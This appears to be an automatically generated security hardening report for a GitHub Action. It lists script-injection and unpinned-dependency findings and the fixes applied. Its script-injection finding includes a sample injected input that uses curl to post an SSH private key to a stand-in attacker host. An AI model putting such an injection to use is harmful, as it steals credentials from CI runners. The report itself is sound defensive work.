<!-- markdownlint-disable -->

# Hardening Report: dev-vikas-soni--gradle-lighthouse/v2.1.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **dev-vikas-soni--gradle-lighthouse/v2.1.1** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Run Lighthouse Audit' run: block directly interpolates ${{ inputs.fail-on-severity }} and ${{ inputs.gradle-args }} into the shell command string (sub-rule a). These are attacker-controlled inputs that pass through YAML template substitution before the shell processes them, enabling arbitrary command injection. For example, a caller could set inputs.gradle-args to '; curl -X POST https://evil.com -d "$(cat ~/.ssh/id_rsa)"' to exfiltrate secrets. The fix is to pass these values via env: variables and reference them as quoted shell variables (e.g., "$FAIL_ON_SEVERITY" and "$GRADLE_ARGS").

Locations:

- `action.yml:30`
- `action.yml:31`

### unpinned-uses (severity: high)

Two uses: references in action.yml are pinned to mutable version tags rather than immutable 40-character SHA digests, making the action vulnerable to supply-chain attacks if those tags are moved or hijacked:
- github/codeql-action/upload-sarif@v4 (line ~36)
- actions/github-script@v9 (line ~57)
These should be pinned to their full commit SHAs, e.g. github/codeql-action/upload-sarif@<40-char-sha> # v4

Locations:

- `action.yml:36`
- `action.yml:57`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on-severity }}" appears directly in run: block of step "Run Lighthouse Audit"; move to env: map

Locations:

- `action.yml:32`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.gradle-args }}" appears directly in run: block of step "Run Lighthouse Audit"; move to env: map

Locations:

- `action.yml:33`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all four findings in action.yml:
1. Script injection (inputs.fail-on-severity, inputs.gradle-args): Moved both expressions from the run: block into the step's env: map as FAIL_ON_SEVERITY and GRADLE_ARGS. The shell script now uses quoted env var references. For GRADLE_ARGS (a list-style input), applied the xargs-based bash array tokenization pattern to safely handle quoted arguments without collapsing them into a single word.
2. Pinned github/codeql-action/upload-sarif@v4 → @24c54180a607b1449ed407dd24f251e4e9147c8d # v4
3. Pinned actions/github-script@v9 → @3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9

